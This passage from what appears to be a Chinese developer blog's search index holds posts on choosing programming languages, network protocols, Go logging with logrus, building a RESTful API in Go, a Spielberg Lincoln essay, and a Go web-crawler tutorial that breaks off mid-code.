    <content type="text"><![CDATA[程序员非常 忠于 他们心爱的语言。编程语言与其说它是技术，还不如说是程序员的思考模式。编程语言是技术和宗教的混合物。《黑客与画家》（Hackers &amp; Painters） 摘要 如何选择编程语言 Stack Overflow：2017年最赚钱的编程语言 社交语言 WHICH IS THE BEST LANGUAGE TO LEARN?Once a mark of the cultured, language-learning is in retreat among English speakers. It’s never too late, but where to start? 编程语言C|Go| Perl| Python| Node.js| R| Ruby|Java What is the difference between a wrapper, bindings and a port? A graph of programming languages connected through compilers 如何选择编程语言在不考虑其他因素的情况下，总的来看，对于应用程序来说，选择总体上最强大、效率也在可接受范围内的编程语言。 如果从 图灵等价（Turing-equivalent） 的角度看来看，所有语言都是一样强大的，但是这对程序员没有意义。关于强大很难正式定义，有一个解释方法是一些功能在一种语言是内置的，但是在另一种语言中需要修改解释器才能做到，那么前者就比后者更强大。 如果A语言有一个运算符可以移除字符串中的空格，而B语言没有这个运算符，这种情况则不足以称A语言比B语言强大，因为你可以在B语言里写一个函数实现这个功能。但是A语言支持某种高级功能（假定是递归），而B语言不支持，你就不可能通过自己编写函数库解决了，这就代表A语言比B语言更强大。 例外情况：1）如果在开发的程序必须与另一个程序紧密配合，那么可能最好还是使用后者的开发语言。2）如果程序只是要做一些很简单的事（比如整数运算或位操作），那就不妨使用一种比较靠近机器的低层次语言，这样运行起来会更快一些。3）如果程序只是为了特定场合一次性使用，那么你最好根据自己需要解决的问题选择具有强大函数库的语言。 论编程方法 书上说，调试（debugging）是最后的步骤，用来纠正打字的错误和疏忽。可是我的工作方法看上去却像编程就是在调试。编程语言是用来帮助思考程序的，而不是用来表达你已经想好的程序。它应该是一支铅笔，而不是一支钢笔。《黑客与画家》（Hackers &amp; Painters）(p22) 不要把编程语言看成那些已完成的程序的表达方式，而应该把它理解成促进程序从无到有的一种媒介。这里的意思是说，成品的材料和开发时用的材料其实是不一样的。搞艺术的人都知道，这两个阶段往往需要不同的媒介。比如，大理石是一种非常良好、耐用的材料，很适合用于最后的成品，但是它极其缺乏弹性和灵活性，所以不适合在构思阶段用来做模型。《黑客与画家》（Hackers &amp; Painters）（p215） 论编程方法 应用软件运行速度提升的关键在于有一个好的性能分析器(profiler)帮助指导程序开发。《黑客与画家》（Hackers &amp; Painters）(p165 ) 关于编译器（Compiler）&amp; 编译原理 Stack Overflow：2017年最赚钱的编程语言 Source: The Highest Paying Programming Languages in 2017 Post By Rich Moy: a Content Marketing Writer and Developer Hiring Expert at Stack Overflow. Top-Paying Languages in the US Go - $110,000 Scala - $110,000 Objective-C - $109,000 CoffeeScript - $105,000 Perl - $105,000 C++- $100,890 R - $100,000 Swift- $100,000 TypeScript- $100,000 Python- $99,000 根据Stack Overflow 的统计数据，2009至2017之间, Go程序员的报酬增长了 1200% ， Scala 增长了 1250%。注意：单位是 $ ，刀 ,美刀 ！ Top-Paying Languages in Worldwide Clojure - $72,000 Rust - $65,714 Elixir - $65,000 F# - $64,516 Go - $64,516 Perl - $63,068 Groovy - $61,809 Ruby - $60,000 Scala - $60,000 R - $57,125 Clojure（发音类似”closure”）是一套现代的Lisp语言的动态语言版。它是一个函数式多用途的语言。Clojure可以执行于Java虚拟机，通用语言运行时以及JavaScript引擎之上,拥有复杂的宏。Clojure第一个稳定版本1.0于2009年5月4日发布，最新的稳定版本是1.8（2016-01-19日）。应用案例：沃尔玛仓储数据库系统、Web新闻和博客信息分析（Chartbeat）、设计开发和基础设施管理工具（8th Light 、Puppet）等，更多 &gt;&gt;&gt;&gt; https://clojure.org/community/success_stories。 Elixir是一个基于 Erlang 虚拟机的函数式、面向并行的通用编程语言。可通过宏实现元编程对其进行扩展，并通过协议支持多态，目标是在维持与现有Erlang工具链及生态环境兼容性的同时，让人们可以在Erlang虚拟机上进行扩展性更好的、高生产率的开发。发行时间 2012年，最新版本 1.4.0（2017年1月5日）。 你可能是一个假的程序员很多同学看了这个排行榜是不是已经跃跃欲试要去美帝捞金了呢？且慢，最好考虑一下能不能通过海关和移民局的审查先。年初，有一位尼日利亚老兄到美帝打短工就差点被当作非法移民遣返： Questions to ask a software engineer:“Write a function to check if a Binary Search Tree is balanced.”海关官员：来，走一个，检查二叉树是否平衡，手写代码…..小哥：What….“What is an abstract class, and why do you need it?”海关官员：什么是抽象类，你为什么要使用它?小哥卒 参考文献 每个程序员书柜必备的编程书籍 |原创 2016-11-04 Dan Luu、刘志勇 InfoQ A Map Showing How Much Time It Takes to Learn Foreign Languages: From Easiest to Hardest A software engineer is detained for several hours by U.S. Customs — and given a test to prove he’s an engineer 新华社：入境美国还要先答题？这个程序员差点吃闭门羹 Julia Evans：Why I love Rust]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Catalog:计算机网络协议大全(Protocol)]]></title>
    <url>%2F2017%2F05%2F26%2FProtocol%2F</url>
    <content type="text"><![CDATA[摘要 一、网络协议大全1.1 TCP Transmission Control Protocol (TCP) RFC 7931.2 UDP User Datagram Protocol (UDP) RFC 7681.3 IP 计算机网络协议：IPv6 与网络安全 IPv6 Routing Header RFC 1883 IPv6 Fragment Header RFC 1883 ICMP for IPv6 RFC 1883 Star Let’s code a TCP/IP stack 其它 Internet Control Messages Protocol (ICMP) RFC 792 Internet Group Management Protocol (IGMP) RFC 3376 Exterior Gateway Protocol RFC 888 2.1 Software 计算机远程通信协议：从 从 CORBA 到 gRPC DNSSEC : Domain Name System Security Extensions ，CDNS安全扩展，RFC 2535 二、Debug Tools2.1 关于网络数据包的捕获、过滤和分析(Packet Capturing) What is Packet Capturing How can it be used What is libpcap What is tcpdump &amp; winpcap &amp; snoop What is BPF What is gopacket 使用tc netem 模拟网络异常 | cizixs 2.2 Netfilter 赵亚：Linux的Netfilter框架深度思考-对比Cisco的ACL 赵亚：探索iptables BPF模块的悲惨历程 资源 Top 100 Computer Networking Blogs and Websites To Follow in 2018 参考文献 赵亚：用Netcat，SSH构建的IP层加密隧道搭建VPN 赵亚： 从一个简单的聊天程序SimpleChat看VPN技术 赵亚：BadVPN详解之–组网原理剖析 赵亚：通信网络与IP网络底层传输技术梳理(SONET/SDH/OTN/ATM/Ethernet/MPLS/PTN…)]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：应用程序的日志管理及可视化]]></title>
    <url>%2F2017%2F05%2F24%2FLog%2F</url>
    <content type="text"><![CDATA[摘要程序中记录日志的首要目的：Troubleshooting。通过记录程序中对外部系统与模块的依赖调用、重要状态信息的变化、关键变量、关键逻辑等，显示基于时间轴的程序运行轨迹，显示业务是否正常、是否存在非预期执行，在出问题时方便还原现场，推断程序运行过程、理清问题的方向。 本文将讨论在实现日志功能过程中常见的一些问题，包括基础API、格式化、日志转发及可视化等方面，代码采用Go语言描述。 一、Basic1、后台输出 123456789package mainimport ( "fmt")func main()&#123; fmt.Println("------hello world-----")&#125; 2、There are no exceptions in Golang, only errors. Go语言不支持传统的 try…catch…finally 这种异常，因为Go语言的设计者们认为，将异常与控制结构混在一起会很容易使得代码变得混乱。因为开发者很容易滥用异常，甚至一个小小的错误都抛出一个异常，替代方案是使用多值返回来返回错误。当然Go并不是全面否定异常的存在，或者用recover+panic语法实现，只是极力不鼓励多用异常。 12345678910111213141516171819package mainimport ( "log" "errors" "fmt")func main() &#123; /* local variable definition */ ... /* function for division which return an error if divide by 0 */ ret,err = div(a, b) if err != nil &#123; log.Fatal(err) &#125; fmt.Println(ret)&#125; 3、写入日志文件: 12345678910111213141516package mainimport ( "log" "os")func main()&#123; f,err :=os.OpenFile("test.log",os.O_WRONLY|os.O_CREATE|os.O_APPEND,0644) if err !=nil&#123; log.Fatal(err) &#125; defer f.Close() log.SetOutput(f) log.Println("==========works==============")&#125; 12YRMacBook-Pro:go-log yanrui$ more test.log2017/05/24 21:46:25 ==========works============== 二、格式化推荐日志工具库：logrus 1$ go get github.com/Sirupsen/logrus 1、JSON format 12345678910111213package mainimport ( log "github.com/Sirupsen/logrus" "github.com/logmatic/logmatic-go")func main() &#123; // use JSONFormatter log.SetFormatter(&amp;logmatic.JSONFormatter&#123;&#125;) // log an event as usual with logrus log.WithFields(log.Fields&#123;"string": "foo", "int": 1, "float": 1.1 &#125;).Info("My first ssl event from golang")&#125; 日志输出样式： 1234567&#123; "@marker":["sourcecode","golang"], "date":"2017-05-24T15:27:40+08:00", "float":1.1,"int":1,"level":"info", "message":"My first ssl event from golang", "string":"foo"&#125; 三、附加上下文通过logrus库可以加入一些上下文信息，例如：主机名称，程序名称或者会话参数等。 1234567contextLogger := log.WithFields(log.Fields&#123; "common": "XXX common content XXX", "other": "YYY special context YYY",&#125;)contextLogger.Info("AAAAAAAAAAAA")contextLogger.Info("BBBBBBBBBBBB") 日志输出样式：1234YRMacBook-Pro:go-log yanrui$ go run LogMatic.go&#123;"@marker":["sourcecode","golang"],"common":"XXX common content XXX","date":"2017-05-24T17:00:08+08:00","level":"info","message":"AAAAAAAAAAAA","other":"YYY special context YYY"&#125;&#123;"@marker":["sourcecode","golang"],"common":"XXX common content XXX","date":"2017-05-24T17:00:08+08:00","level":"info","message":"BBBBBBBBBBBB","other":"YYY special context YYY"&#125;YRMacBook-Pro:go-log yanrui$ 四、Hooks我们还可以利用Hook机制实现日志功能扩展，例如Syslog hook，将输出的日志发送到指定的Syslog服务。 1234567891011121314151617package mainimport ( log "github.com/sirupsen/logrus" "gopkg.in/gemnasium/logrus-airbrake-hook.v2" // the package is named "aibrake" logrus_syslog "github.com/sirupsen/logrus/hooks/syslog" "log/syslog")func main()&#123; hook, err := logrus_syslog.NewSyslogHook("udp", "59.37.0.1:514", syslog.LOG_INFO, "") if err != nil &#123; log.Error("Unable to connect to local syslog daemon") &#125; else &#123; log.AddHook(hook) &#125;&#125; 验证是否发送Syslog： 123456$ sudo tcpdump | grep 59.37.0.1tcpdump: data link type PKTAPtcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on pktap, link-type PKTAP (Apple DLT_PKTAP), capture size 262144 bytes18:51:05.663612 IP 192.168.199.15.58819 &gt; 59.37.0.1.syslog: SYSLOG kernel.info, length: 31418:51:05.663657 IP 192.168.199.15.58819 &gt; 59.37.0.1.syslog: SYSLOG kernel.info, length: 314 五、可视化在真实场景中日志数据体量非常庞大，日志存储只是第一步，更多的情况是需要查看特定指标或者能够快速检索信息，此时日志分析平台就发挥作用了。以logmatic为例，可以在它的官网注册https://logmatic.io/，免费体验。 在使用logmatic之前，需要下载它的hook支持：1$ go get github.com/logmatic/logmatic-go 1234567func main() &#123; // instantiate a new Logger with your Logmatic APIKey // 国内访问比较慢 log.AddHook(logmatic.NewLogmaticHook("p53uTkOhSEqI3-116DynkQ")) // ..........&#125; 效果如下： 六、加密与安全性（待续）https://zvelo.com/securely-logging-tracing-http-requests-go/ NaCl: Networking and Cryptography library package golang.org/x/crypto/openpgp 维基百科：PGP saltpack | a modern crypto messaging format:saltpack is a binary message format, encoded using the MessagePack format. 扩展阅读：开发语言&amp;代码工程 Stack Overflow：2017年最赚钱的编程语言 玩转编程语言:构建自定义代码生成器 远程通信协议:从 CORBA 到 gRPC 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 参考文献 云风的BLOG：断点单步跟踪是一种低效的调试方法 logmatic.io:Our Guide to a Golang logs world logmatic.io:Beyond Application Monitoring Syslog RFC 5424 Golang Blog:Error handling and Go Dave Cheney:Why Go gets exceptions right 蝈蝈俊:Go的异常处理 defer, panic, recover 知乎：Go 语言的错误处理机制是一个优秀的设计吗？ Monolog优化及打造ELK友好的日志格式 | Leo108’s Blog 4 Ways to Watch or Monitor Log Files in Real Time 【年度案例】Twitter高性能分布式日志系统架构解析 | 原创 2015-12-24 郭斯杰 高可用架构 BEST PRACTICES:EVENT LOG MANAGEMENT FOR SECURITY AND COMPLIANCE INITIATIVES| By Ipswitch, Inc. Network Managment Division]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：基于Go语言快速构建RESTful API服务]]></title>
    <url>%2F2017%2F05%2F23%2FRestfulAPI%2F</url>
    <content type="text"><![CDATA[摘要 What is a JSON API? 启动一个RESTful服务 抽象数据模型 增加路径分发功能 重构：Handlers &amp; Router In this post, we will not only cover how to use Go to create a RESTful JSON API, but we will also talk about good RESTful design. 部分内容删减调整，原文请查看： Making a RESTful JSON API in Go,2014Nov Author:CORY LANOU:a full stack technologist who has specialized in start-ups for the last 17 years. I’m currently working at InfluxDB on their core data team. I also help lead and organizer several community technology meetups and do Go training. 一、What is a JSON API?JSON API 是数据交互规范，用以定义客户端如何获取与修改资源，以及服务器如何响应对应请求。JSON API设计用来最小化请求的数量，以及客户端与服务器间传输的数据量。通过遵循共同的约定，可以提高开发效率，利用更普遍的工具,基于 JSON API 的客户端还能够充分利用缓存，以提升性能。(更多：http://jsonapi.org.cn/format/)。 示例：1234567891011121314151617181920&#123; "links": &#123; "posts.author": &#123; "href": "http://example.com/people/&#123;posts.author&#125;", "type": "people" &#125;, "posts.comments": &#123; "href": "http://example.com/comments/&#123;posts.comments&#125;", "type": "comments" &#125; &#125;, "posts": [&#123; "id": "1", "title": "Rails is Omakase", "links": &#123; "author": "9", "comments": [ "5", "12", "17", "20" ] &#125; &#125;]&#125; 启动一个RESTful服务1234$ go run main.go$ curl http://localhost:8080Hello,"/" 1234567891011121314151617package mainimport ( "fmt" "html" "log" "net/http")func main() &#123; http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, "Hello, %q", html.EscapeString(r.URL.Path)) &#125;) log.Fatal(http.ListenAndServe(":8080", nil))&#125; 增加路径分发功能路径又称”终点”（endpoint），表示API的具体网址。在RESTful架构中，每个网址代表一种资源（resource）。第三方组件（Gorilla Mux package）： “github.com/gorilla/mux” 12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "log" "net/http" "github.com/gorilla/mux")func main() &#123; router := mux.NewRouter().StrictSlash(true) router.HandleFunc("/", Index) router.HandleFunc("/todos", TodoIndex) router.HandleFunc("/todos/&#123;todoId&#125;", TodoShow) log.Fatal(http.ListenAndServe(":8080", router))&#125;func Index(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, "Welcome!")&#125;func TodoIndex(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, "Todo Index!")&#125;func TodoShow(w http.ResponseWriter, r *http.Request) &#123; vars := mux.Vars(r) todoId := vars["todoId"] fmt.Fprintln(w, "Todo show:", todoId)&#125; 访问测试： 123456$ curl http://localhost:8080/todo404 page not found$ curl http://localhost:8080/todosTodo Index! ,"/todos"$ curl http://localhost:8080/todos/&#123;123&#125;TodoShow: ,"123" 抽象数据模型创建一个数据模型“Todo”、“Routes”。在其它语言中，使用类（class）实现。在Go语言中，没有class，必须使用结构(struct)。 Todo.go123456789101112package mainimport "time"type Todo struct &#123; Id int `json:"id"` Name string `json:"name"` Completed bool `json:"completed"` Due time.Time `json:"due"`&#125;type Todos []Todo Routes.go123456789101112131415package mainimport ( "net/http" "github.com/gorilla/mux")type Route struct &#123; Name string Method string Pattern string HandlerFunc http.HandlerFunc&#125;type Routes []Route 重构：Handlers &amp; RouterHandlers.go1234567891011121314151617181920212223242526272829package mainimport ( "encoding/json" "fmt" "net/http" "github.com/gorilla/mux")func Index(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, "Welcome!")&#125;func TodoIndex(w http.ResponseWriter, r *http.Request) &#123; todos := Todos&#123; Todo&#123;Name: "Write presentation"&#125;, Todo&#123;Name: "Host meetup"&#125;, &#125; if err := json.NewEncoder(w).Encode(todos); err != nil &#123; panic(err) &#125;&#125;func TodoShow(w http.ResponseWriter, r *http.Request) &#123; vars := mux.Vars(r) todoId := vars["todoId"] fmt.Fprintln(w, "Todo show:", todoId)&#125; Router.go1234567891011121314151617181920212223package mainimport ( "net/http" "github.com/gorilla/mux")func NewRouter() *mux.Router &#123; router := mux.NewRouter().StrictSlash(true) for _, route := range routes &#123; var handler http.Handler handler = route.HandlerFunc handler = Logger(handler, route.Name) router. Methods(route.Method). Path(route.Pattern). Name(route.Name). Handler(handler) &#125; return router&#125; 启动入口是不是清爽很多！Main.go123456789101112Main.gopackage mainimport ( "log" "net/http")func main() &#123; router := NewRouter() log.Fatal(http.ListenAndServe(":8080", router))&#125; web access:http://localhost:8080/todos Todo Index! ,”/todos”[ { “id”:0, “name”:”Write sth ….”, “completed”:false, “due”:”0001-01-01T00:00:00 }, { “id”:1, “name”:”Host meetup ….”, “completed”:false, “due”:”0001-01-01T00:00:00Z” }] 增强功能：持久化1234func TodoCreate(w http.ResponseWriter, r *http.Request) &#123; var todo Todo //add Todo instance&#125; 增强功能：日志12342017/05/23 15:57:23 http: multiple response.WriteHeader calls2017/05/23 15:57:23 GET /todos TodoIndex 6.945807ms2017/05/23 16:18:40 http: multiple response.WriteHeader calls2017/05/23 16:18:40 GET /todos TodoIndex 2.127435ms Things We Didn’t Do 版本控制API版本迭代 &amp; 跨版本资源访问。常用做法是将版本号放在URL，较为简洁，例如：https://localhost:8080/v1/另一种做法是将版本号放在HTTP头信息中。 授权验证：涉及到OAuth和JWT。（1）OAuth 2.0，OAuth2 is an authentication framework,RFC 6749OAuth2是一种授权框架，提供了一套详细的、可供实践的指导性解决方案。OAuth 2.0定义了四种授权方式。授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。 Getting Started with OAuth2 in Go | Youtube Extensible security first OAuth 2.0 and OpenID Connect SDK for Go (2)JSON web tokens,JWT is an authentication protocol,RFC 7519JWT是一种安全协议。基本思路就是用户提供用户名和密码给认证服务器，服务器验证用户提交信息信息的合法性；如果验证成功，会产生并返回一个Token（令牌），用户可以使用这个token访问服务器上受保护的资源。 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ header:定义算法(alg:ALGORITHM)和TOKEN TYPE（typ） 1234&#123; "alg": "HS256", "typ": "JWT"&#125; Data:12345&#123; "sub": "1234567890", "name": "John Doe", "admin": true&#125; AuthN | Modern, open source, web app authentication API Authentication With Node.js eTags：关于缓存、性能和用户标识和追踪。 参考文献 阮一峰:RESTful API 设计指南 CORY LANOU:Making a RESTful JSON API in Go,2014Nov InfoQ:使用ETags减少Web应用带宽和负载 Stackoverflow:jwt vs oauth authentication OAuth 2 VS JSON Web Tokens:How to secure an API,20160605 阮一峰:理解OAuth 2.0,201405 RESTful routing in Go | Karl Seguin]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:Ruby]]></title>
    <url>%2F2017%2F05%2F16%2FLanguage-Ruby-lang%2F</url>
    <content type="text"><![CDATA[摘要 ABCApplication MacOS Package Manage : brew OpenSource Project Manage : Redmine 扩展阅读 玩转编程语言系列 参考文献]]></content>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:Node.js]]></title>
    <url>%2F2017%2F05%2F16%2FLanguage-Node-lang%2F</url>
    <content type="text"><![CDATA[摘要 玩转编程语言:构建自定义代码生成器 Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js Application1. Blog &amp; Code Generator 我的写作工具链 玩转编程语言:构建自定义代码生成器 2. 远程通信协议：从 CORBA 到 gRPC 一、远程调用技术简史:从 CORBA 到 gRPC 二、gRPC 简介 三、gRPC 示例代码 3. GraphQL Node.js 服务端实践之 GraphQL 初探 | 淘宝前端团队FED Build Better GraphQL APIs: Thinking In Graphs | November 11, 2017 4. Machine Learning Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js ABC module manage12345678910111213141516171819202122YRMacBook-Pro:Node yanrui$ node&gt; console.log(module);Module &#123; id: &apos;&lt;repl&gt;&apos;, exports: &#123;&#125;, parent: undefined, filename: null, loaded: false, children: [], paths: [ &apos;/Users/yanrui/project/gRPC/Client/Node/repl/node_modules&apos;, &apos;/Users/yanrui/project/gRPC/Client/Node/node_modules&apos;, &apos;/Users/yanrui/project/gRPC/Client/node_modules&apos;, &apos;/Users/yanrui/project/gRPC/node_modules&apos;, &apos;/Users/yanrui/project/node_modules&apos;, &apos;/Users/yanrui/node_modules&apos;, &apos;/Users/node_modules&apos;, &apos;/node_modules&apos;, &apos;/Users/yanrui/.node_modules&apos;, &apos;/Users/yanrui/.node_libraries&apos;, &apos;/usr/local/Cellar/node/7.10.0/lib/node&apos; ] &#125;&gt; process.exit(); 扩展阅读 玩转编程语言系列 参考文献 npm 模块安装机制简介 Using Redis with Node JS How to create a zero dependency HTTP/2 static file server with Node.js (with examples) How JavaScript works: the rendering engine and tips to optimize its performance]]></content>
      <tags>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:R]]></title>
    <url>%2F2017%2F05%2F16%2FLanguae-R-lang%2F</url>
    <content type="text"><![CDATA[摘要 Introduction | 简介Core Concept | 核心概念Concept AConcept BConcept CArchitecture | 架构Best Practice | 最佳实践 扩展阅读 玩转编程语言系列 参考文献 R Lang: Zero to Hero | A guide for statistical computing and graphics. Top 20 R Libraries for Data Science in 2018]]></content>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:Perl]]></title>
    <url>%2F2017%2F05%2F16%2FLanguage-Perl-lang%2F</url>
    <content type="text"><![CDATA[摘要 扩展阅读 玩转编程语言系列 参考文献]]></content>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lincoln Research:斯皮尔伯格的林肯情怀]]></title>
    <url>%2F2017%2F05%2F13%2FLincoln-Spielberg%2F</url>
    <content type="text"><![CDATA[摘要 讲故事的人：斯皮尔伯格的林肯情怀 2012年11月9日，电影《林肯》在北美首映。 该片在美国本土累计票房1.82亿美元，全球总票房2.75亿美元（2011年10月17日开拍，同年12月19日杀青，预算：6500万美元）。除了票房大获成功，在业内也赢得一片赞美之声：荣获第70届金球奖及第85届奥斯卡金像奖，媒体综合评分高达88分，《芝加哥论坛报》、《华盛顿邮报》、《华尔街时报》、《纽约时报》等多家媒体给出满分；烂番茄新鲜度高达91%。 “路易斯与斯皮尔伯格的大师级合作令人惊异，成片俨然超越了我们的想象，直接飞升为旷世的艺术赞歌。” 时人给予了大师作品极高的评价。 斯皮尔伯格给出的解释是：“我的影片几乎无不植根于我的童年经历。” 童年时代亚伯拉罕-林肯是斯皮尔伯格最持久的执念，他的林肯情怀可以追溯到童年时代。在他七八岁的时候，他的一个叔叔带着他去华盛顿参观历史名胜，而最让他难忘的一处景点就是林肯纪念堂——他在那里吓了一跳。 “我很小，而林肯很高大，坐在宝座，就是那把大椅子上。我被这尊雕像深深地震慑住了，几乎不敢直视林肯的脸。” 然而，这并未阻止他阅读关于林肯的东西。“现在我知道我曾经患有阅读困难症——当时我并不知道——但是当我开始阅读时，提到林肯的材料永远比学校的理科习题更能让我读进去。”他补充道，“能做的事我都做了，除了买一辆林肯车——我什么都有，就是没有车。我读了很多书，看了很多纪录片。” “每当探究一段我不是很了解的历史时，我的第一反应就是气氛老师从没教过我这东西。” 预约剧本直到1999年，斯皮尔伯格遇到了多丽丝-科恩斯-古德温，询问她接下来准备做什么。她表示自己想写一本讲述林肯任总统期间的书，而斯皮尔伯格对此做出的答复是：“我会买的。” 她说她连出版商都没找到，他回答道：“这与我无关。我现在就要向你买下它，等你找到出版商的时候，只要告诉他们你已经把电影版权给了我和梦工厂就行。” （《Team of Rivals: The Political Genius of Abraham Lincoln 》（林肯与劲敌幕僚）） “如果一部电影要反映某种现实生活中的境遇，它必须把所有真实的故事讲得像正弦曲线一样波澜起伏，也就是说要有荒诞，有喜剧，有痛失，有强大的顽固势力对你穷追不舍，然后最终得到救赎。” 书成之后，剧本改编的过程也颇为艰难。剧本初稿长达约550页——一个典型电影剧本的长度通常约为120页。剧本中有一段内容引起了斯皮尔伯格的共鸣。它讲述了废除奴隶制的美国宪法第十三条修正案的通过，以及美国内战的结束。换句话说，这些事件发生在林肯生命中的最后几个月里。斯皮尔伯格让库什纳重点描写这一部分，而最终定稿的剧本约为有150页，片长约为两个半小时。 Think different “我就像一个眼馋肚饱的小孩。我想拍的电影实在太多了，我曾经在闲坐无事时纳闷为何没人去拍关于这样那样题材的电影。现在，我可以亲自拍摄那些被遗漏的电影了。” 大师的意义也许就在于不断突破自己。从早期的《侏罗纪公园》、《大白鲨》、《E.T.外星人》，无不在全球掀起一场轰动，突破了人们原有的想象空间。斯皮尔伯格后来的作品又将视角延伸至大屠杀、奴隶制度、战争等题材，包括《林肯》在内，陆续拍摄了《辛德勒的名单》、《拯救大兵瑞恩》、《战马》、《间谍之桥》等一系列作品，他作为犹太裔家庭出身的美国人，也算是一次家国历史的回溯反思。从这些作品中，多少总能品味出些许对人类、对生命的终极关怀，也许这就是他能与林肯心灵相通的原因所在吧。 “其实每一部电影都是一个时间胶囊，当你拍完一部影片、向演职人员道别时，你也把一段生命埋在了那个片场——你知道的，而那段生命将会永远留在那里。” 参考文献1.《讲故事的人：斯皮尔伯格传》 [ 美 ]理查德-什克尔 ISBN 978-7-5502-4662-1]]></content>
      <tags>
        <tag>Art</tag>
        <tag>Lincoln</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:编译器与编译原理]]></title>
    <url>%2F2017%2F05%2F12%2FLanguage-Compiler%2F</url>
    <content type="text"><![CDATA[摘要 扩展阅读 玩转编程语言系列 参考文献 Gentle introduction into compilers. Part 1: Lexical analysis and Scanner | A guide to understanding ECMAScript (JavaScript) spec lexical grammar and TypeScript scanner]]></content>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（五）基于网络爬虫制作可视化图表]]></title>
    <url>%2F2017%2F05%2F12%2FVisualization-Charts%2F</url>
    <content type="text"><![CDATA[摘要 基于网络爬虫的可视化图表:golang,goquery 案例：最近十年全国彩票销售变化情况 案例：中国科学院院士分布 数据可视化技术方案:基于 SVG (D3、Raphael)、基于 Canvas（Echarts） 基于网络爬虫的可视化图表我们身处大数据时代，几乎在所有工作例如商业技术、金融、科研教育等行业，以及日常生活中都可能需要涉及数据分析活动。横向来看数据分析的知识体系贯穿数据获取、数据存储、数据分析、数据挖掘、数据可视化等各大部分；按数据来源分，即可以是自己收集的数据，也可以采购数据或者基于公开数据集。 基于公开数据进行分析的话，必须提到的就是网络爬虫（web crawler），也被称作网络蜘蛛（spider）、自动索引程序（automatic indexer），搜索引擎（Google，百度等）就是大众日常生活中接触到的最典型、最强大的爬虫。 公开数据包括政府（统计局、央行、银监会、证监会等）、企业、社会组织和互联网上的个人发布信息等。在浩如烟海的互联网内容中，有价值信息犹如‘待字闺中’深藏的美女，等待有心人去挖掘。例如： 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 为了实现上述图表，相关技术方案的要点如下： 开发语言：基于 Golang 实现爬虫基本功能，主要考虑 Go 语言 自身对于网络方面的强大支持，语言级 Goroutines 提供并发高性能支持。 HTML选择器: goquery jQuery-style HTML manipulation in Go 数据存储: csv,PostgreSQL 等 数据可视化：ECharts 案例数据来源页面： 专栏：彩票管理 2017年11月份全国彩票销售情况 全体院士名单 院士个人介绍 12345678910111213141516171819//caipiao_task.gofunc Handle_GMOF_CaiPiao_Month_BatchTask() &#123; data := read_csv_caipiao("./data/caipiao_list.csv", ",") if data != nil &#123; for i := range data &#123; go Handle_GMOF_CaiPiao_Month_Task(url) &#125; &lt;-time.After(60 * time.Second) &#125;&#125;func Handle_GMOF_CaiPiao_Month_Task(url string) &#123; if url != "" &#123; myspider := init_GMOF_CaiPiao_Month_HTMLSpider(url) ctx, _ := myspider.Setup(nil) myspider.Spin(ctx) &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475//caipiao_spider.gopackage mainimport ( "log" "regexp" "strings" "github.com/PuerkitoBio/goquery" "github.com/celrenheit/spider")type GMOF_CaiPiao_Month_HTMLSpider struct &#123; title string `json:"title"` url string `json:"url"` desc string `json:"desc"`&#125;func init_GMOF_CaiPiao_Month_HTMLSpider(url string) *GMOF_CaiPiao_Month_HTMLSpider &#123; spider := NewGMOF_CaiPiao_Month_HTMLSpider() spider.url = url return spider&#125;func (w *GMOF_CaiPiao_Month_HTMLSpider) Setup(ctx *spider.Context) (*spider.Context, error) &#123; return spider.NewHTTPContext("GET", w.url, nil)&#125;func (w *GMOF_CaiPiao_Month_HTMLSpider) Spin(ctx *spider.Context) error &#123; if _, err := ctx.DoRequest(); err != nil &#123; return err &#125; html, err := ctx.HTMLParser() if err != nil &#123; return err &#125; caipiao := NewGMOF_CaiPiao_Month() //&lt;title&gt;&lt;/title&gt; caipiao.Title = html.Find("title").Eq(0).Text() caipiao.Title = Convert2String(caipiao.Title, GB18030) //class="TRS_Editor" html.Find(".TRS_Editor").Each(func(i int, s *goquery.Selection) &#123; content := s.Find("p").Text() caipiao.Content = content if content != "" &#123; content = Convert2String(content, GB18030) rows := strings.Split(content, "。") for _, value := range rows &#123; 